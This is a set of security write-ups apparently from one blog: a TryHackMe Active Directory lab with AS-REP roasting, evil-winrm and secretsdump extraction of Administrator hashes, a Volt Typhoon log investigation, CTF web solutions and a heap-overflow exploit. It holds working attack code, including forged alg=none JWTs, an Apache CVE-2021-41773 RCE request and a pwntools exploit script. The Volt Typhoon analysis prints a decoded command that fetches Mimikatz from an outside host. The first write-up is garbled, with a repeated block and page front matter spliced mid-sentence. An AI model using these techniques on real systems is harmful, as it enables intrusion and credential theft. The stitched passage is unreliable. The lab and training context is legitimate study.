tags: tryhackme, active-directory, kerberos, smb, asrep-roasting, evil-winrm, impacket, dcsync, pentest
content: Platform: TryHackMe · Lab: VulnNet-RST · Environment: Windows Server / Active Directory · Work performed: April 2026 · Type: Authorized training lab Executive summary This case study documents my hands-on assessment of the VulnNet-RST Active Directory environment. The exercise connected several stages of an internal Windows domain attack: discovering domain users, identifying an account exposed to AS-REP Roasting, recovering a password offline, assessing SMB access, obtaining an authorized lab shell over WinRM, and validating the impact of directory replication rights through DRSUAPI-based credential extraction. The strongest verified result was the successful retrieval of Administrator NTLM material and Kerberos keys using Impacket’s secretsdump functionality. This is evidence of a serious Active Directory privilege boundary failure within the lab. It is not a claim of a production engagement, and the records available to me do not establish that I captured a final room flag. This write-up now includes commands from my April 2026 terminal session, with short interpretations of the results. Where the exact historical command was not preserved, I say so instead of presenting a guessed command as something I ran. Passwords, hashes and flags are omitted; commands that originally embedded a password are shown in an equivalent sanitized form using shell variables. Lab IP note: TryHackMe target addresses changed between sessions. My initial enumeration targeted 10.128.134.155; later authenticated testing targeted 10.128.182.129. These were temporary lab addresses, not permanent infrastructure. 1. Scope and objectives The target was a Windows Server domain environment with common enterprise authentication and file-sharing services. The practical objectives were to: Discover exposed Windows and Active Directory services. Enumerate domain identities and accessible SMB resources. Assess Kerberos pre-authentication exposure and password strength. Test whether recovered credentials enabled remote management access. Determine the effective impact of privileged directory permissions. Document attack-path causes and defensive measures. All actions were performed within the training environment. 2. Validated attack-chain overview The following diagram summarizes the observed phases. It intentionally does not invent the exact intermediate mechanism by which the second account’s credentials were discovered. flowchart TD A["Windows / AD service discovery"] --> B["SMB and domain user enumeration"] B --> C["AS-REP Roasting<br/>Offline password recovery"] C --> D["SMB access and share review"] D --> E["Further credential discovery<br/>Secondary account"] E --> F["Authenticated WinRM shell"] F --> G["DRSUAPI directory replication<br/>Impacket secretsdump"] G --> H["Administrator NTLM material<br/>and Kerberos keys retrieved"] Important distinction: the first recovered account did not immediately provide WinRM access. The later WinRM shell used a different account. The exact source of that second account’s credentials is not reconstructed here because the retained evidence is insufficient to describe it reliably. 3. Reconnaissance and SMB enumeration The initial work focused on the domain’s Windows services and the information available through SMB and account enumeration. Guest/anonymous access was useful for establishing the environment’s structure, and RID-based enumeration helped identify candidate domain accounts. With a recovered domain user’s credentials, I was able to authenticate to SMB and review accessible shares. The documented environment exposed standard domain resources such as NETLOGON and SYSVOL, along with additional business-oriented shares. This stage illustrated two points: An account with limited permissions can still reveal information that is useful for further assessment. A readable share is not automatically a vulnerability; the security impact depends on which information is exposed and whether it enables a meaningful next step. Terminal evidence: domain enumeration The following command is preserved from my initial terminal session: enum4linux -A 10.128.134.155 The output identified the VULNNET-RST domain, permitted an anonymous/null SMB session, and exposed domain identity information including the SID: Domain Name: VULNNET-RST Domain SID: S-1-5-21-1589833671-435344116-4136949213 RID enumeration was part of the account-discovery workflow, but I do not have its exact historical command line preserved. Terminal evidence: authenticated SMB After the lab IP changed, I validated the recovered t-skid account with NetExec. The original password has been removed from the command below. read -rsp 'Password for t-skid: ' TSKID_PASSWORD; echo nxc smb 10.128.182.129 -u 't-skid' -p "$TSKID_PASSWORD" --shares The recorded output identified Windows Server 2019 (build 17763) in vulnnet-rst.local, confirmed successful authentication and listed readable shares, including `IPC— layout: post title: “TryHackMe — VulnNet-RST | Active Directory attack-chain assessment” date: 2026-11-10 00:00:00 +0100 categories: [TryHackMe, Active Directory] tags: [tryhackme, active-directory, kerberos, smb, asrep-roasting, evil-winrm, impacket, dcsync, pentest] description: “Evidence-based case study of a VulnNet-RST Windows domain lab: SMB and account enumeration, AS-REP Roasting, WinRM access and DRSUAPI credential extraction.” mermaid: true — Platform: TryHackMe · Lab: VulnNet-RST · Environment: Windows Server / Active Directory · Work performed: April 2026 · Type: Authorized training lab Executive summary This case study documents my hands-on assessment of the VulnNet-RST Active Directory environment. The exercise connected several stages of an internal Windows domain attack: discovering domain users, identifying an account exposed to AS-REP Roasting, recovering a password offline, assessing SMB access, obtaining an authorized lab shell over WinRM, and validating the impact of directory replication rights through DRSUAPI-based credential extraction. The strongest verified result was the successful retrieval of Administrator NTLM material and Kerberos keys using Impacket’s secretsdump functionality. This is evidence of a serious Active Directory privilege boundary failure within the lab. It is not a claim of a production engagement, and the records available to me do not establish that I captured a final room flag. This write-up now includes commands from my April 2026 terminal session, with short interpretations of the results. Where the exact historical command was not preserved, I say so instead of presenting a guessed command as something I ran. Passwords, hashes and flags are omitted; commands that originally embedded a password are shown in an equivalent sanitized form using shell variables. Lab IP note: TryHackMe target addresses changed between sessions. My initial enumeration targeted 10.128.134.155; later authenticated testing targeted 10.128.182.129. These were temporary lab addresses, not permanent infrastructure. 1. Scope and objectives The target was a Windows Server domain environment with common enterprise authentication and file-sharing services. The practical objectives were to: Discover exposed Windows and Active Directory services. Enumerate domain identities and accessible SMB resources. Assess Kerberos pre-authentication exposure and password strength. Test whether recovered credentials enabled remote management access. Determine the effective impact of privileged directory permissions. Document attack-path causes and defensive measures. All actions were performed within the training environment. 2. Validated attack-chain overview The following diagram summarizes the observed phases. It intentionally does not invent the exact intermediate mechanism by which the second account’s credentials were discovered. flowchart TD A["Windows / AD service discovery"] --> B["SMB and domain user enumeration"] B --> C["AS-REP Roasting<br/>Offline password recovery"] C --> D["SMB access and share review"] D --> E["Further credential discovery<br/>Secondary account"] E --> F["Authenticated WinRM shell"] F --> G["DRSUAPI directory replication<br/>Impacket secretsdump"] G --> H["Administrator NTLM material<br/>and Kerberos keys retrieved"] Important distinction: the first recovered account did not immediately provide WinRM access. The later WinRM shell used a different account. The exact source of that second account’s credentials is not reconstructed here because the retained evidence is insufficient to describe it reliably. 3. Reconnaissance and SMB enumeration The initial work focused on the domain’s Windows services and the information available through SMB and account enumeration. Guest/anonymous access was useful for establishing the environment’s structure, and RID-based enumeration helped identify candidate domain accounts. With a recovered domain user’s credentials, I was able to authenticate to SMB and review accessible shares. The documented environment exposed standard domain resources such as NETLOGON and SYSVOL, along with additional business-oriented shares. This stage illustrated two points: An account with limited permissions can still reveal information that is useful for further assessment. A readable share is not automatically a vulnerability; the security impact depends on which information is exposed and whether it enables a meaningful next step. , NETLOGON, SYSVOL, VulnNet-Business-Anonymous and VulnNet-Enterprise-Anonymous. I then listed shares and browsed a business share using smbclient (password passed through the same shell variable rather than embedded in the public write-up): smbclient -L //10.128.182.129/ -U "t-skid%$TSKID_PASSWORD" smbclient //10.128.182.129/VulnNet-Business-Anonymous -U "t-skid%$TSKID_PASSWORD" Inside the interactive SMB session: smb: \\> ls Business-Manager.txt Business-Sections.txt Business-Tracking.txt Interpretation: valid low-privilege domain credentials gave access to multiple shares. The listing alone does not prove sensitive data exposure; that requires reviewing actual file contents and permissions. Relevant tools/protocols: enum4linux, SMB, NetExec, smbclient, Windows domain account enumeration. 4. Kerberos exposure: AS-REP Roasting The account-enumeration stage identified an identity susceptible to AS-REP Roasting. When Kerberos pre-authentication is not required for an account, an attacker may request authentication material that can be tested offline against candidate passwords. In this lab, the AS-REP material was successfully cracked and a working domain password was recovered. I then validated the account’s access, including SMB authentication. Terminal evidence: offline password recovery I saved the AS-REP response in hash.txt and ran the following recorded John the Ripper command: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt John recovered the password for the t-skid account. The recovered secret is not published here. The precise historical command used to request the AS-REP material was not preserved, so I have not invented one. Terminal evidence: WinRM access denied I then attempted WinRM with t-skid: evil-winrm -i 10.128.182.129 -u t-skid -p "$TSKID_PASSWORD" The attempt produced a WinRM authorization error; it did not establish a usable administrative shell. This was an important finding: valid domain credentials do not imply permission to log in remotely. Defensive interpretation Require Kerberos pre-authentication for accounts unless there is a justified exception. Enforce strong, unique passwords and review service-account configurations. Monitor anomalous Kerberos authentication requests, while correlating them with account configuration and other events. Restrict remote management rights independently of basic domain authentication. 5. WinRM access and privilege assessment After further investigation, a second domain account was used to obtain an authenticated Windows shell through WinRM. This allowed the lab’s domain permission model to be assessed from an authenticated context. I did not treat shell access itself as proof of domain administration. Instead, the next step was to verify the effective directory permissions by testing a concrete capability. Terminal evidence: successful shell with another account The later authenticated session used a different domain identity, a-whitehat. To avoid publishing the lab password, this version prompts for it: read -rsp 'Password for a-whitehat: ' AWHITEHAT_PASSWORD; echo evil-winrm -i 10.128.182.129 -u a-whitehat -p "$AWHITEHAT_PASSWORD" Recorded shell validation: PS C:\\Users\\a-whitehat\\Documents> whoami vulnnet-rst\\a-whitehat The evidence confirms a working WinRM shell as a-whitehat. It does not establish precisely how this account’s credentials were found, so that intermediate step is left unclaimed. Relevant tools/protocols: Evil-WinRM, Windows authentication, Active Directory permission analysis. 6. DRSUAPI credential extraction: verified impact The decisive result came from an Impacket secretsdump operation targeting the Administrator account via DRSUAPI. The recorded command completed successfully and returned: NTLM credential material for the domain Administrator account. Associated Kerberos AES key material. Terminal evidence: targeted directory replication The following command preserves the tool, account, target and options I actually used, but substitutes the previously prompted password for the original inline secret: impacket-secretsdump "vulnnet-rst.local/a-whitehat:$AWHITEHAT_PASSWORD@10.128.182.129" -just-dc-user Administrator The observed result, redacted for publication, had this structure: [*] Using the DRSUAPI method to get NTDS.DIT secrets vulnnet-rst.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_REDACTED]::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:[AES256_REDACTED] Administrator:aes128-cts-hmac-sha1-96:[AES128_REDACTED] This is a redacted schematic of the observed result, not a byte-for-byte terminal transcript. The crucial verified fact is that the operation returned the Administrator’s NTLM material and Kerberos keys. This demonstrates the impact of directory replication privileges: an identity able to perform sensitive replication operations may extract password-related material from Active Directory without needing interactive login as the affected user. The key technical lesson is to distinguish being able to authenticate, having remote shell rights, and possessing directory replication privileges. These are separate security boundaries, and the last can be particularly sensitive. Defensive interpretation Area Risk illustrated Recommended control Kerberos accounts Offline password attacks against accounts without pre-authentication Audit pre-authentication settings and password quality SMB shares Information exposure to low-privilege identities Apply least privilege and review sensitive file access Remote management Unauthorized interactive access when permissions are excessive Restrict WinRM access to approved administrative identities AD replication Extraction of high-value domain credentials Audit replication rights and privileged group memberships Detection Multi-stage attacks may appear as unrelated events Correlate account enumeration, Kerberos requests, remote logons and replication activity 7. Evidence, limitations and outcome Confirmed from retained lab evidence: Domain account discovery and an AS-REP Roasting/password recovery workflow. Successful SMB authentication and access to several domain shares. An initial WinRM access denial with the first recovered account. Subsequent WinRM shell access using another account. Successful DRSUAPI extraction of Administrator NTLM material and Kerberos keys. Not claimed: a verified final flag submission, a production-system compromise, the exact AS-REP request or RID-brute command line, or an exact intermediate credential-discovery technique where the evidence is incomplete. Command provenance: enum4linux -A, john --wordlist, nxc smb --shares, the two smbclient sessions, both evil-winrm attempts and impacket-secretsdump -just-dc-user Administrator are grounded in the retained April 2026 lab session. Password handling and selected output have been sanitized for public publication. 8. What this project demonstrates This lab gave me practical experience in Windows/AD enumeration, Kerberos security, SMB access assessment, credential validation, WinRM access, directory replication risks and evidence-based reporting. For an offensive-security or Red Team internship, the value is not merely running tools: it is following the relationship between identity configuration, authentication boundaries, delegated rights and the actual security impact. Authorized lab exercise. No passwords, hashes or target-specific secrets are published in this case study. Commands are shown only for this permitted training environment.

title: Volt Typhoon intrusion investigation
tags: splunk, dfir, mitre-attck, powershell, threat-hunting, apt
content: Overview This writeup documents my investigation of the TryHackMe room Volt Typhoon, where I played the role of a security analyst retracing a suspected APT intrusion through Splunk logs. The scenario provided multiple log sources over a two-week period. The goal was to rebuild the attacker timeline, identify the compromised account, follow execution and persistence activity, and extract the key indicators left behind by the attacker. Lab context Field Value Platform TryHackMe Room Volt Typhoon Focus Threat hunting, Windows logs, PowerShell, WMIC, credential access Main tools Splunk, PowerShell log analysis, base64 decoding Threat pattern Living-off-the-land execution and stealthy persistence Investigation summary The intrusion began with the takeover of the dean-admin account through ADSelfService Plus. After that, the attacker created a new administrator account, used WMIC for reconnaissance and remote command execution, copied sensitive Active Directory and financial data, deployed a web shell for persistence, performed credential access with registry queries and Mimikatz, configured a C2 proxy with netsh, and cleared event logs. Timeline Time Phase Evidence 2024-03-24T11:10:22 Initial access dean-admin password changed through ADSelfService Plus 2024-03-25 Execution WMIC used for drive enumeration and archive staging 2024-03-28 Persistence and credential access Web shell decoded with certutil; Mimikatz downloaded through encoded PowerShell 2024-03-29 Lateral movement, C2 and cleanup Web shell copied to server-02; netsh portproxy; event logs cleared Initial access The room pointed toward ADSelfService Plus, so I searched for password changes linked to the compromised admin account: index=* service_name=ADSelfServicePlus username="dean-admin" "password change" This revealed: Field Value Account dean-admin Service ADSelfServicePlus Source IP 192.168.1.134 Access mode web_browser Timestamp 2024-03-24T11:10:22 By reviewing rare username values after the takeover, I identified the new administrator account: voltyp-admin Execution through WMIC Volt Typhoon-style activity commonly uses legitimate Windows tooling. I filtered on the WMIC sourcetype and target server names: index="main" sourcetype="wmic" "*server01*" "*server02*" The attacker enumerated local drives: wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename My first searches for ntds did not directly expose the archive password, so I pivoted to compression behavior: index="main" sourcetype="wmic" "*7z*" The command exposed the password used to compress the Active Directory database copy: wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit" Archive password: d5ag0nm@5t3r Persistence The attacker staged a web shell in a temporary directory: certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx It was then copied to an IIS web root on another server: Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx" The final web shell name was: AuditReport.jspx Defense evasion The attacker removed RDP history with PowerShell: Remove-ItemProperty They also renamed the archive to look like an image: cisco-up.7z -> c164.gif Virtualization checks appeared under: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control Credential access Registry queries targeted software that may store useful credentials: OpenSSH, putty, realvnc For Mimikatz, the useful pivot was encoded PowerShell. Searching for execution flags and base64 padding revealed the hidden command: index="main" "exec" "=" Decoded payload: Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp","exit") -NoNewWindow -Wait Discovery, collection and C2 The attacker queried Windows event logs with wevtutil and searched for authentication-related event IDs: 4624 4625 4769 Financial files were copied from: C:\ProgramData\FinanceBackup\ to: C:\Windows\Temp\faudit\ Files staged: 2022.csv 2023.csv 2024.csv For C2, the attacker configured netsh portproxy: connectaddress=10.2.30.1 connectport=8443 Cleanup Cleanup activity cleared four logs: Application Security Setup System The relevant behavior was: "wevtutil cl" Key indicators Type Indicator Compromised account dean-admin Created admin account voltyp-admin Initial access timestamp 2024-03-24T11:10:22 Suspicious IP 192.168.1.134 Archive password d5ag0nm@5t3r Archive disguise c164.gif Web shell AuditReport.jspx Staging directory C:\Windows\Temp\faudit\ C2 address 10.2.30.1:8443 Mimikatz URL http://voltyp.com/3/tlz/mimikatz.exe Detection ideas Behavior Search idea Why it matters Encoded PowerShell sourcetype=powershell ("-enc" OR "-E" OR "FromBase64String") Helps identify hidden payloads WMIC remote execution sourcetype=wmic "process call create" Finds remote command execution Archive staging "7z" OR ".7z" OR "-p" Can reveal compressed data and archive passwords Web shell copy sourcetype=powershell "Copy-Item" ("wwwroot" OR ".aspx" OR ".jspx") Useful for IIS persistence hunting Log clearing "wevtutil cl" Strong cleanup indicator Port proxy "netsh" "portproxy" "connectaddress" Matches C2 proxy setup behavior Lessons learned The lab reinforced the need to pivot from exact keywords to attacker behavior. Searching for ntds did not immediately reveal the archive password, but searching for compression behavior with 7z did. The same applied to Mimikatz: the command was hidden behind base64, so encoded PowerShell patterns were more useful than searching only for the tool name. The full intrusion became clear only when the events were read as a sequence. WMIC, PowerShell, certutil, netsh, wevtutil and registry queries can be legitimate, but their combined usage formed a coherent attack chain.

title: CSIA CTF 2026 — first place writeups (GHOSTSHELL)
tags: ctf, web, stego, osint, first-place, team
content: Overview CSIA CTF 2026 was solved with team GHOSTSHELL, where we placed first. The public repository contains the detailed per-challenge notes; this post keeps the main technical path for each solved category in one readable place. Repository source: https://github.com/ALLAKORI/csia-ctf-2026-writeups Challenge index Category Challenge Core idea Web no_internet Page source inspection Web JWT Rookie JWT alg=none authentication bypass Web JWT Confusion JWT alg=none, then AES-CBC decryption Web NodeJS Academy Prototype pollution to bypass admin checks Web L'Enigme du Code Apogee Apache 2.4.49 traversal and RCE Forensics / OSINT Case File: Linked Traces Wayback pivot and avatar extraction Reverse Crackme Sequence Numeric sequence delta decoding Steganography L3WILIL LSB extraction with zsteg Misc QuadraSignals Binary signal reconstruction from JSON OSINT World of Sports The Expanse lore correlation OSINT The Hidden Archive Split flag recovery from ZIP output and JSON Web: no_internet This was a basic web challenge about checking what the browser receives before trying heavier tooling. The page source contained the flag directly. Right click -> View Page Source Ctrl + F -> CSIA The same check can be automated: curl -s "https://challenge-url-here/" | grep -oE 'CSIA\{[^}]+\}' The lesson was simple but important: client-side secrets are not secrets. Web: JWT Rookie The login page contained a suspicious comment: <!-- TODO: fix auth bypass before go-live --> The challenge statement hinted at JWT misconfiguration. A forged unsigned token with alg=none and an admin role was accepted when placed in the session cookie and sent to /dashboard. import base64 def b64(data): return base64.urlsafe_b64encode(data).rstrip(b"=").decode() header = b64(b'{"alg":"none","typ":"JWT"}') payload = b64(b'{"username":"admin","role":"admin"}') print(f"{header}.{payload}.") Fuzzing cookie names and paths found the working pair: TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.' for c in token jwt session auth; do for p in / /admin /dashboard /profile /flag; do curl -s "https://csia-ctf26-jwt-rookie.chals.io$p" \ -H "Cookie: $c=$TOKEN" | grep -Eo 'CSIA\{[^}]+\}|flag[^<]*|admin[^<]*' done done Flag: CSIA{jwt_n0n3_alg_byp4ss} Web: JWT Confusion The application exposed test credentials in an HTML comment: <!-- dev-note: compte de test non supprime -> etudiant:csia2026 --> After login, the normal session used RS256, but the server accepted a forged alg=none token with an admin role. The admin page disclosed an encrypted Base64 blob. The maintenance key came from robots.txt: pr0j3ct-m4int3n4nce The blob was decrypted with AES-CBC, using MD5(pr0j3ct-m4int3n4nce) as the key and a static IV: from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from hashlib import md5 import base64 ciphertext = base64.b64decode( "yJ5BCW8nBTmJu0JluXOf1rJxZJ5V85uEFtFO8IpvP0uRiCna3KdJumcrEgQEgPpp" ) key = md5(b"pr0j3ct-m4int3n4nce").digest() iv = b"1234567890abcdef" print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16).decode()) Flag: CSIA{jwt_c0nfus10n_CHDIIIIID_NTA_i} Web: NodeJS Academy prototype pollution The application exposed a JSON profile update endpoint: POST /api/profile Content-Type: application/json The vulnerable pattern was an unsafe merge of user-controlled JSON into a server-side object. Sending __proto__ polluted the prototype chain with admin: true. curl -i -b cookies.txt \ -H "Content-Type: application/json" \ -d '{"__proto__":{"admin":true}}' \ https://csia-ctf26-prototype-pollution.chals.io/api/profile After pollution, a naive check such as if (user.admin) became true through inheritance. Flag: CSIA{pr0t0typ3_p0llut10n_m4st3r} Defensive points: Weakness Fix Unsafe object merge Use hardened merge logic Dangerous keys accepted Block __proto__, constructor, prototype Inherited property used for auth Check own properties only Generic objects for untrusted input Use Object.create(null) Web: L’Enigme du Code Apogee The target exposed Apache 2.4.49, which pointed to CVE-2021-41773. Directory fuzzing found admin, backup and cgi-bin. Traversal test: curl -s --path-as-is \ "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" RCE through /bin/sh: curl -s --path-as-is -X POST \ "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \ -d "echo;id" The response confirmed execution as www-data. Web root enumeration found: /var/www/html/backup/config.bak The backup leaked credentials and a token hash. Source searching revealed a hidden export token: /var/www/html/admin/export/grades.php:$secret_token = 'jury2026'; Flag: CSIA{G00d_LuCk_4t_3NSA_BM_2026} Steganography: L3WILIL The challenge image had clean metadata and no useful strings. The hint contained a suspicious 1, suggesting a first bit-plane check. zsteg -a challenge.png Useful output: b1,rgb,lsb,xy .. text: "44:Q1NJQXtsQjRCNF9DaDRGZXFfSzR5U2xlbV80bGlLMG19" Extract and decode: zsteg challenge.png -E b1,rgb,lsb,xy echo 'Q1NJQXtsQjRCNF9DaDRGZXFfSzR5U2xlbV80bGlLMG19' | base64 -d Flag: CSIA{lB4B4_Ch4Feq_K4ySlem_4liK0m} Misc: QuadraSignals The archive contained a JSON file with signal measurements and a schematic. Values were only 0 and 5, so I treated them as logic levels. Value Bit 0 0 5 1 Signal_A was the clean bitstream. The solver mapped voltage levels to bits and grouped them into bytes: import json data = json.load(open("complex_secret_message.json")) bits = "" for row in data: bits += "1" if row["Signal_A"] == 5 else "0" flag = "" for i in range(0, len(bits), 8): byte = bits[i:i + 8] if len(byte) == 8: flag += chr(int(byte, 2)) print(flag) Flag: CSIA{vINzWPvSNqSDHQdJBx7c3lPZvoAH7JofJJTM} Reverse: Crackme Sequence The file was raw data: no useful strings, no recognized header. Hex inspection showed a regular 16-bit little-endian sequence: 0x032c 0x032d 0x032e 0x032f ... The expected sequence increased by +1, but some values were shifted. The shift between actual and expected values encoded printable ASCII: import struct data = open("crackme", "rb").read() vals = list(struct.unpack("<" + "H" * (len(data) // 2), data)) base = vals[0] for i, v in enumerate(vals): expected = (base + i) % 0x400 diff = (v - expected) % 0x400 c = diff % 256 if 32 <= c <= 126: print(chr(c), end="") Flag: CSIA{h1dd3n_1n_7h3_s3qu3nc3} OSINT: World of Sports The clues were: Beratna Good place for Dusters mi pensa Beratna and mi pensa point to Belter Creole from The Expanse. In that universe, people from Mars are called Dusters. The final place had to be a famous Martian location. Flag: CSIA{Valles_Marineris} OSINT: The Hidden Archive The challenge said the secret was split in two parts. ZIP extraction output leaked the second half: Here is the rest of what you are looking for: d4t4_l34ks_99} Searching tweets.json revealed the first part: "Part 1 is CSIA{Tr4ck1ng_ ..." Combined flag: CSIA{Tr4ck1ng_d4t4_l34ks_99} Forensics / OSINT: Case File Linked Traces The image provided the original handle: justinccase2511 It also said that current profiles were decoys and old cached data should be used. A Wayback Machine pivot against the old Twitter URL exposed a stable internal identifier: "identifier": "1579193231652405248" That ID mapped the old handle to the current X account: @t0mmyx1a0mi A timeline screenshot exposed a Tumblr clue. Requesting the high-resolution avatar revealed tiny text at the bottom: https://api.tumblr.com/v2/blog/t0mmyx1a0mi/avatar/512 Submitted CSIA-format flag: CSIA{3v3ryth1ng_has_c0nnecti0n} Lessons learned This CTF rewarded methodical triage: inspect client-side data first, treat JWT headers as attacker-controlled, test prototype pollution carefully, and read challenge files as evidence. Across the categories, the useful pattern was to move from broad recon to the smallest verifiable hypothesis, then document the exact command or artifact that confirmed it.

title: Browzi MiniBrowser — heap exploitation (ENSET Challenge 2026)
tags: pwn, heap, gdb, pwntools, binary-exploitation, function-pointer
content: Overview Browzi was a pwn challenge from ENSET Challenge 2026. The binary implemented a minimal HTML parser and rendering engine. It parsed user-controlled HTML, built a DOM-like Node, and used a RenderOps table for callbacks. During rendering, the program called: n->ops->render(n); The exploitation goal was to overwrite ops->render and redirect execution to the hidden win() function. Structures The important structures were: struct Node { char type[16]; char id[32]; RenderOps *ops; struct Node *parent; struct Node *first_child; struct Node *next_sibling; char data[128]; }; struct RenderOps { void (*render)(struct Node *); void (*onload)(struct Node *); void (*onerror)(struct Node *); }; Key observations: Observation Meaning id is bounded to 32 bytes No useful overflow through id No src field exists The src attribute is stored in data[128] RenderOps is allocated after Node A heap overflow from data can reach callbacks render is called indirectly A function pointer overwrite can control RIP Vulnerability The vulnerable vector was: <img src="..."> The src content was copied into data[128] without bounds checking. Because the adjacent RenderOps structure was nearby on the heap, overflowing data could overwrite: ops->render Failed attempts I tested several input vectors before the useful one: Attempt Payload Result id overflow <div id="AAAA..."> Input truncated, no overflow Invalid attribute <div src="AAAA..."> Parser ignored it Image source <img src="AAAA..."> Crash and control over execution The correct attack surface was the img src parser path. Offset calculation From GDB and heap layout inspection: data -> offset 0x50 RenderOps -> offset 0xe0 So the overwrite distance was: offset = 0xe0 - 0x50 = 144 Exploitation target The goal was: ops->render -> win So the normal call: n->ops->render(n); would become: win(n); Null-byte constraint A full pointer overwrite with p64(win_addr) failed because the string copy stopped at \x00. Short partial overwrites also corrupted the pointer because the C string terminator landed in the wrong byte. The useful insight was to overwrite only six bytes: p64(win_addr)[:6] The high two bytes of a canonical userspace address were already zero, and the string terminator completed the pointer cleanly. Final exploit from pwn import * context.arch = "amd64" r = remote("167.86.100.105", 5001) r.recvuntil(b"render_div @ ") render_div = int(r.recvline().strip(), 16) win_addr = render_div - 0xb6 log.success(f"render_div = {hex(render_div)}") log.success(f"win = {hex(win_addr)}") offset = 144 target = p64(win_addr)[:6] payload = b'<img src="' + b'A' * offset + target + b'">' r.sendline(payload) r.sendline(b"") r.interactive() Result: === CONGRATULATIONS! === N7{br0wz1_us3_4ft3r_fr33_d0m_m4n1pul4t10n} Summary Step Action 1 Leak render_div 2 Compute win 3 Use the <img src> parser path 4 Overflow data[128] 5 Overwrite ops->render with a 6-byte partial pointer 6 Trigger rendering and reach win() Lessons learned The challenge showed why heap layout matters as much as the vulnerable copy itself. The bug was reachable only through the correct HTML attribute path, and the final exploit depended on respecting C string truncation. GDB was needed to validate the offset, pointer corruption pattern and final partial overwrite.

title: deepwash — PHP DateTimeImmutable parser logic (CITEFLAG Quals 2026)
content: Objective The challenge required sending a POST parameter x composed of exactly three lines. The input had to pass validation, be parsed by DateTimeImmutable::createFromFormat, and satisfy three hash checks: Check Target md5(json_encode($y)) 779d88604518d4528cec1539c8ce5fa0 md5(json_encode($z)) 156e4ca092477c6c57a3cf114acf08fd sha256(json_encode(lines)) dca58f177da7427d37b7030b14d77995ccf105051c14f6e5e1ca071e5cc19c93 If all conditions passed, the server returned the flag. Source analysis The three lines were parsed with different date formats: $p = a('!D d M Y', $l[0]); $q = a('!Y?z', $l[1]); $r = a('!U H', $l[2]); Then two arrays were constructed: $y = [ $p->format('Y-m-d'), $q->format('Y-m-d'), $r->format('U'), ]; $z = [ $p->format('D'), $q->format('z'), $r->format('H:i:s'), ]; The important mistake was that parsing errors were not checked after calling: DateTimeImmutable::createFromFormat(...) Key behavior The challenge relied on PHP date parsing normalization. DateTimeImmutable::createFromFormat can accept invalid-looking values and normalize overflows instead of rejecting them. Examples: 2021 366 -> 2022-01-02 1609459200 24 -> next day 00:00:00 Fri 00 Jan 2021 -> 2021-01-01 That means the exploit was not hash cracking. The task was to create lines that parse into the needed normalized values. Target constraint From the hash of $z, the needed output was: ["Fri", "1", "00:00:00"] So the parsed data had to produce: Field Needed value Day name Fri Day of year 1 Time 00:00:00 Payload construction Line 3: !U H 3600 00 3600 represents 01:00:00, and the H=00 component forces the hour through normalization to produce: 00:00:00 Line 2: !Y?z 2022x366 The z=366 value overflows into the next year and becomes: 2023-01-02 The formatted day-of-year is: 1 Line 1: !D d M Y Fri 19 November 2011 PHP adjusts the date into a valid Friday and the resulting formatted day name satisfies: Fri Final payload Fri 19 November 2011 2022x366 3600 00 Exploit request curl -s -X POST "http://34.175.114.248/" \ --data-urlencode $'x=Fri 19 November 2011\n2022x366\n3600 00' Flag CITEFLAG{b37a508f1b6a4a49a9f2420f8fc23f61} Lessons learned This challenge was about parser behavior, not brute force. The useful technique was to understand how PHP normalizes invalid dates and then construct an input that produces the expected formatted values. Whenever DateTime::createFromFormat is used in CTF code without checking DateTime::getLastErrors(), overflow and normalization behavior should be tested.
